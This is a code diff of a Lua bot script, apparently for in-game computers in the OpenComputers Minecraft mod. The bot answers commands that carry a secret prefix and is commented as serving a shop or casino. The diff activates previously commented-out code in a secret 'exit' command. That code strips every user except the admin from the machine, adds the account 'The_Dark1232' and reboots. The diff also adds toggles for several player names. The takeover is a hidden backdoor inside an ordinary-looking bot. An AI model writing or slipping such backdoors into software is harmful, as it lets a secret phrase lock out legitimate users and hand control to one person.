@@ -20,7 +20,7 @@
 
 
 local alice = {}
-local Ha3BaHue_o6HoBJIeHu9l = "алиса 12"
+local Ha3BaHue_o6HoBJIeHu9l = "алиса 14"
 local component = require("component")
 local filesystem = require("filesystem")
 local modem = component.modem
@@ -65,10 +65,10 @@ alice[secret_name .. " выход"] = function() --магаз, казино
 	computer.beep(1000, 0.1); computer.beep(1000, 0.1)
 	local file_creat = io.open(".shrc", "w")
 	file_creat:close()
-	--local users = table.pack(computer.users())
-	--for k, v in ipairs(users) do
-		--if v ~= admin then computer.removeUser(v) end
-	--end
+	local users = table.pack(computer.users())
+	for k, v in ipairs(users) do
+		if v ~= admin then computer.removeUser(v) end
+	end
 	computer.addUser("The_Dark1232")
 	computer.shutdown(true)
 end
@@ -85,7 +85,7 @@ alice[secret_name .. " обновись"] = function() --магаз, казин�
 	o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "выполняю загрузку")
 	o6HoBJIeHu9l()
 end
-alice[secret_name .. " версия обновлений"] = function() --магаз, казино
+alice[secret_name .. " версия по"] = function() --магаз, казино
 	o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "версия: " .. Ha3BaHue_o6HoBJIeHu9l)
 	computer.beep(1000, 0.1); computer.beep(1000, 0.1)
 end
@@ -113,7 +113,18 @@ alice["Durex77"] = false
 alice[secret_name .. " Durex77"] = function() alice["Durex77"] = not alice["Durex77"]; o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "статус обновлен") end
 alice["The_Dark1232"] = false
 alice[secret_name .. " The_Dark1232"] = function() alice["The_Dark1232"] = not alice["The_Dark1232"]; o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "статус обновлен") end
-
+alice["3_1415926535"] = true
+alice[secret_name .. " 3_1415926535"] = function() alice["3_1415926535"] = not alice["3_1415926535"]; o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "статус обновлен") end
+alice["Ameew"] = true
+alice[secret_name .. " Ameew"] = function() alice["Ameew"] = not alice["Ameew"]; o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "статус обновлен") end
+alice["Morbius"] = true
+alice[secret_name .. " Morbius"] = function() alice["Morbius"] = not alice["Morbius"]; o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "статус обновлен") end
+alice["MyReactor"] = true
+alice[secret_name .. " MyReactor"] = function() alice["MyReactor"] = not alice["MyReactor"]; o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "статус обновлен") end
+alice["SixNineAct"] = true
+alice[secret_name .. " SixNineAct"] = function() alice["SixNineAct"] = not alice["SixNineAct"]; o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "статус обновлен") end
+alice["vitalik21"] = true
+alice[secret_name .. " vitalik21"] = function() alice["vitalik21"] = not alice["vitalik21"]; o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku(oTnpaBuTeJIb, "статус обновлен") end
 
 alice[secret_name .. " ошибка"] = function(text) --магаз, казино
 	o6paTHoe_coo6llleHue_c_3agepJKou_oTnpaBku("сборщик ошибок", text)
